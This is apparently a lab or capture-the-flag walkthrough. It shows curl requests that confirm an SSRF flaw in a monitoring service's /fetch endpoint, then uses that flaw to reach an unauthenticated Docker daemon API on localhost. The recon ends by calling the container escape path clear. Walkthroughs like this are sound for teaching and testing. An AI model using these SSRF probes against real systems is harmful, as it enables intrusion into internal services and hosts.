# Finding the Bug

## Identify the SSRF

The monitoring service has a `/fetch` endpoint. Test it with an external URL:

```bash
curl -s -X POST http://localhost:8080/fetch \
  -H "Content-Type: application/json" \
  -d '{"url": "http://localhost:8080/health"}'
```

```json
{"status": 200, "content_type": "application/json", "body": "{\"status\": \"ok\"}"}
```

The server fetched the URL and returned the response body. There is no filtering on the target.

## Probe for internal services

Try the Docker daemon on port 2376:

```bash
curl -s -X POST http://localhost:8080/fetch \
  -H "Content-Type: application/json" \
  -d '{"url": "http://127.0.0.1:2376/_ping"}'
```

```json
{"status": 200, "content_type": "text/plain", "body": "OK"}
```

Docker is running and the API responds without authentication. Get more information:

```bash
curl -s -X POST http://localhost:8080/fetch \
  -H "Content-Type: application/json" \
  -d '{"url": "http://127.0.0.1:2376/info"}' | python3 -m json.tool
```

```json
{
  "status": 200,
  "content_type": "application/json",
  "body": "{\"ID\": \"sim:docker:daemon\", \"ServerVersion\": \"24.0.5\", \"Containers\": 0, \"OperatingSystem\": \"Linux\"}"
}
```

The Docker daemon is reachable via SSRF, unauthenticated, and reports the server version. The escape path is now clear.
